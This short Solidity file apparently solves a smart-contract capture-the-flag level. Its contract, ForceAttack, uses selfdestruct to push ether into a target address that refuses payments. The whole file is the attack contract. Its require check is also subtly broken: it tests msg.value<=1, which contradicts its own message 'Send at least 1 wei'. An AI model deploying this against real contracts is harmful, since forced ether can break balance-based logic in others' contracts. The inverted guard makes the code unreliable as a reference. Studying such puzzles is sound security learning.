// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    function destructAndSendEther(address payable destination) payable public{
        require(msg.value<=1,"Send at least 1 wei");
        selfdestruct(destination);
    }
}